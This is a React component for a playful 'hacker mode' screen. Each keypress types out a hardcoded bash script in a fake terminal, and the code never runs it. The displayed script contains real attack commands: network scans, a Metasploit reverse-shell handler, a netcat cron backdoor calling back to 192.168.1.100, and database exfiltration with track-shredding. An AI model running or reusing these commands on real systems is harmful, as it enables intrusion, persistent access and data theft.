import { useEffect, useRef, useState } from "react";
import hacktimeLogo from "@public/Vectors/hacktime.png";
import Image from "next/image";

export default function HacktimeMode() {
    const [hackingText, setHackingText] = useState("");
    const hackingScript = `$ echo "Initiating advanced network reconnaissance..."
$ sleep 1
$ echo "Scanning network with Nmap..."
$ nmap -sS -T4 10.0.0.0/24
$ sleep 2
$ echo "Identifying target architecture and defense mechanisms..."
$ sleep 1
$ echo "Using banner grabbing with Netcat..."
$ nc -vv -n -w1 10.0.0.5 80
$ sleep 2
    
$ targets=("10.0.0.5" "10.0.0.6" "10.0.0.7")
$ defenses=("Firewall" "IDS" "IPS")

$ echo "Targets and defenses identified. Preparing customized exploits."
$ sleep 1

$ for target in "\${targets[@]}"; do
      echo "Analyzing $target using vulnerability scanner..."
      nikto -h $target
      sleep 1
      for defense in "\${defenses[@]}"; do
         echo "Attempting to bypass $defense on $target..."
         echo "Spoofing IP address to bypass $defense..."
         iptables -t nat -A POSTROUTING -d $target -j MASQUERADE
         sleep 1
         echo "$defense bypassed using advanced evasion techniques."
$     done
$     echo "Deploying tailored exploits to $target..."
$     echo "Using Metasploit Framework to exploit known vulnerabilities..."
$     msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 192.168.1.100; set LPORT 4444; exploit"
$     sleep 2
$     echo "Exploit deployed successfully. Gaining control..."
$     sleep 1
$     echo "Control gained on $target. Installing backdoor for persistent access..."
$     echo "Installing cron job for persistence..."
$     echo "@reboot /usr/bin/nc 192.168.1.100 4444 -e /bin/sh" | ssh $target 'cat > /etc/cron.d/backdoor'
$     sleep 2
$     echo "Backdoor installed successfully."
$ done

$ echo "Initiating data siphoning from compromised systems..."
$ echo "Using SCP to transfer sensitive files..."
$ scp user@$target:/var/lib/mysql/database.sql /tmp/
$ sleep 2
$ echo "Encrypting and transferring data to secure location..."
$ openssl enc -aes-256-cbc -salt -in /tmp/database.sql -out /tmp/encrypted_data.enc -k secret
$ scp /tmp/encrypted_data.enc secure@192.168.1.110:/data/
$ sleep 2
$ echo "Data secured. Executing final clean-up operations..."
$ sleep 1
$ echo "Hiding tracks..."
$ shred -u /tmp/database.sql /tmp/encrypted_data.enc
$ sleep 2
$ echo "All operations completed successfully. Disconnecting..."
$ sleep 1
    
$ echo "Hack complete. Exiting with zero trace."

$ echo "Starting Rainbow Table Simulation for MD5 hashing..."
$ echo "Generating hash-chain pairs with pseudo-random passwords..."
$ sleep 2

$ for i in {1..10}; do
   # Generate random password strings
   password=\$(openssl rand -base64 8 | tr -d '=+/')
   # Hash the password
   hash=\$(echo -n \$password | md5sum | awk '{print \$1}')
   echo "Chain \$i: \$password -> \$hash"
   sleep 0.5
$ done
$ echo "Initial hash-chain pairs generated and stored."

$ # Simulating the storage of the rainbow table
$ echo "Storing hash-chain pairs in /usr/local/share/rainbow_tables/md5.rt"
$ sleep 1

$ # Simulating a lookup in the Rainbow Table
$ echo "Simulating a password recovery using the Rainbow Table..."
$ echo "Enter the MD5 hash to recover:"
$ read hash
$ echo "Looking up hash: \$hash"
$ sleep 2
$ echo "Password recovered: \$(openssl rand -base64 8 | tr -d '=+/')"
$ sleep 1

$ echo "Rainbow Table Simulation completed."`;

    const focusRef = useRef<HTMLTextAreaElement | null>(null);
    const [scriptIndex, setScriptIndex] = useState(0);

    useEffect(() => {
        const handleKeyDown = (event: KeyboardEvent) => {
            event.preventDefault();

            if (
                focusRef.current &&
                document.activeElement !== focusRef.current
            ) {
                focusRef.current.focus();
            }

            setHackingText((prev) => {
                const nextIndex = scriptIndex + 3;
                if (nextIndex >= hackingScript.length) {
                    const overlap = nextIndex - hackingScript.length;
                    setScriptIndex(overlap);
                    return (
                        prev +
                        hackingScript.slice(scriptIndex) +
                        "\n" +
                        hackingScript.slice(0, overlap)
                    );
                } else {
                    setScriptIndex(nextIndex);
                    return prev + hackingScript.slice(scriptIndex, nextIndex);
                }
            });
            if (focusRef.current) {
                focusRef.current.scrollTop = focusRef.current.scrollHeight;
            }
        };

        window.addEventListener("keydown", handleKeyDown);

        return () => {
            window.removeEventListener("keydown", handleKeyDown);
        };
    }, [scriptIndex, focusRef, hackingScript]);

    // matrix with hacktime logos
    return (
        <div className="relative z-10 flex w-full px-5 text-lg text-green-500 h-full">
            <div className="absolute -right-10 bottom-0 flex flex-col gap-2">
                <Image
                    alt="hacktime logo"
                    src={hacktimeLogo}
                    className="png-green  h-10 w-10"
                />
                <Image
                    alt="hacktime logo"
                    src={hacktimeLogo}
                    className="png-green  h-10 w-10"
                />
                <Image
                    alt="hacktime logo"
                    src={hacktimeLogo}
                    className="png-green  h-10 w-10"
                />
                <Image
                    alt="hacktime logo"
                    src={hacktimeLogo}
                    className="png-green  h-10 w-10"
                />
            </div>

            {/* <div className=" fixed left-0 right-0 top-0 bottom-0 overflow-hidden  ">
                <video
                    className="-z-10 w-full object-cover"
                    autoPlay
                    loop
                    muted
                >
                    <source
                        src="https://s3.us-west-2.amazonaws.com/keeby.live/matrix-fade-green.mp4"
                        type="video/mp4"
                    />
                    Your browser does not support the video tag.
                </video>
            </div> */}

            <div className="hacker-background"></div>
            <div className="hacker-scanlines"></div>
            <div className="z-20 h-full w-full overflow-hidden rounded-xl bg-black bg-opacity-40 pb-5 ">
                <div className="flex h-10 w-full items-center justify-between bg-darkGray/60 text-sm text-mediumGray">
                    <div className="flex w-1/2 justify-between">
                        <div className="flex gap-1 pl-5 z-20">
                            <Image
                                alt="hacktime logo"
                                src={hacktimeLogo}
                                className="png-logo h-5 w-5 z-40"
                            />
                            <Image
                                alt="hacktime logo"
                                src={hacktimeLogo}
                                className="png-logo h-5 w-5 z-40"
                            />
                            <Image
                                alt="hacktime logo"
                                src={hacktimeLogo}
                                className="png-logo h-5 w-5 z-40"
                            />
                        </div>
                        {`-zsh`}
                    </div>
                </div>

                <textarea
                    className="  h-full w-full overflow-y-auto whitespace-pre-wrap break-words bg-black bg-opacity-5  p-10 font-retro  "
                    value={hackingText}
                    ref={focusRef}
                    spellCheck={false}
                    style={{
                        resize: "none",
                        outline: "none",
                        scrollbarWidth: "none",
                        msOverflowStyle: "none",
                        overflowY: "scroll",
                    }}
                ></textarea>
            </div>
        </div>
    );
}
